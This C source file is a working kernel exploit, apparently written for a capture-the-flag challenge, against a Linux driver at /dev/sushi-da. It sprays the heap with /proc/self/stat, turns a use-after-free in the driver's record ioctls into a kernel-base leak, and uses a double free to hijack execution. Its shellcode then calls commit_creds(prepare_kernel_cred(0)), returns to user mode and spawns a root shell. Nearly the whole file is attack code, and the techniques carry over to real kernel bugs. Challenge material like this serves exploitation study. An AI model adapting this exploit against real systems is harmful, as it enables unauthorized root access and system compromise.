#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

#include "../include/sushi-da.h"


// commands
#define DEV_PATH "/dev/sushi-da"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  puts("[!] NIRUGIRI!");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("\n\n Got a root! ðŸŽ‰ðŸŽ‰ðŸŽ‰");
  execve("/bin/sh",argv,envp);
}

// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

ulong kernbase;
ulong commit_creds, prepare_kernel_cred;

static void shellcode(void){
  ulong init_cred;
  asm(
    "mov %%rdi, 0x0\n"
    "call %P1\n"
    "movq %0, %%rax"
    : "=r" (init_cred) : "r" ((void*)prepare_kernel_cred) : "memory"
  );
  asm(
      "mov %%rdi, %0\n"
      "call %P1\n" 
      ::"r"((void *)init_cred), "r"((void *)commit_creds) : "memory"
  );
  asm(
      "swapgs\n"
      "mov %%rax, %0\n"
      "push %%rax\n"
      "mov %%rax, %1\n"
      "push %%rax\n"
      "mov %%rax, %2\n"
      "push %%rax\n"
      "mov %%rax, %3\n"
      "push %%rax\n"
      "mov %%rax, %4\n"
      "push %%rax\n"
      "iretq\n" 
      ::"r"(user_ss), "r"(user_sp), "r"(user_rflags), "r"(user_cs), "r"(&NIRUGIRI) : "memory"
    );
}
// (END utils)

void register_record(int fd, int score, char *date){
  struct ioctl_register_query  q = {
    .record = {.result = score,},
  };
  strncpy(q.record.date, date, 0x10);
  if(ioctl(fd, SUSHI_REGISTER_RECORD, &q) < 0){
    errExit("register_record()");
  } 
}

void fetch_record(int fd, int rank, struct record *record){
  struct ioctl_fetch_query q = {
    .rank = rank,
  };
  if(ioctl(fd, SUSHI_FETCH_RECORD, &q) < 0){
    errExit("fetch_record()");
  } 
  memcpy(record, &q.record, sizeof(struct record));
}

void clear_record(int fd){
  if(ioctl(fd, SUSHI_CLEAR_OLD_RECORD, NULL) < 0){
    errExit("clear_record()");
  } 
}

void show_rankings(int fd){
  struct ioctl_fetch_query q;
  for (int ix = 0; ix != 3; ++ix){
    q.rank = ix + 1;
    if (ioctl(fd, SUSHI_FETCH_RECORD, &q) < 0) break;
    printf("%d: %ld sec : %s\n", ix + 1, q.record.result, q.record.date);
  }
}

void clear_all_records(int fd){
  if(ioctl(fd, SUSHI_CLEAR_ALL_RECORD, NULL) < 0){
    errExit("clear_all_records()");
  }
}

int main(int argc, char *argv[]) {
  char inbuf[0x200];
  char outbuf[0x200];
  int seqfd;
  int tmpfd[0x90];
  memset(inbuf, 0, 0x200);
  memset(outbuf, 0, 0x200);
  printf("[.] pid: %d\n", getpid());
  printf("[.] NIRUGIRI at %p\n", &NIRUGIRI);
  printf("[.] shellcode at %p\n", &shellcode);
  int fd = open(DEV_PATH, O_RDWR);
  if(fd <= 2){
    perror("[ERROR] failed to open mora");
    exit(0);
  }
  clear_all_records(fd);

  struct record r;
  struct record r1 = {
    .result = 1,
    .date = "1930/03/12",
  };

  // heap spray
  puts("[.] heap spraying...");
  for (int ix = 0; ix != 0x90; ++ix)
  {
    tmpfd[ix] = open("/proc/self/stat", O_RDONLY);
  }

  // leak kernbase
  puts("[.] generating kUAF...");
  register_record(fd, r1.result, r1.date);
  clear_record(fd);
  if((seqfd = open("/proc/self/stat", O_RDONLY)) <= 0){
    errExit("open seq_operations");
  }
  fetch_record(fd, 1, &r);

  const ulong _single_start = *((long*)r.date);
  const ulong kernbase = _single_start - 0x194090;
  printf("[+] single_start: %lx\n", _single_start);
  printf("[+] kernbase: %lx\n", kernbase);
  commit_creds = kernbase + 0x06cd00;
  printf("[!] commit_creds: %lx\n", commit_creds);
  prepare_kernel_cred = kernbase + 0x6d110;
  printf("[!] prepare_kernel_cred: %lx\n", prepare_kernel_cred);

  // double free
  struct record r2 = {
    .result = 3,
  };
  *((ulong*)r2.date) = &shellcode;
  clear_record(fd);
  register_record(fd, r2.result, r2.date);

  // get RIP
  save_state();
  for (int ix = 0; ix != 0x80; ++ix){
    close(tmpfd[0x90 - 1 - ix]);
  }
  read(seqfd, inbuf, 0x10);

  return 0;
}
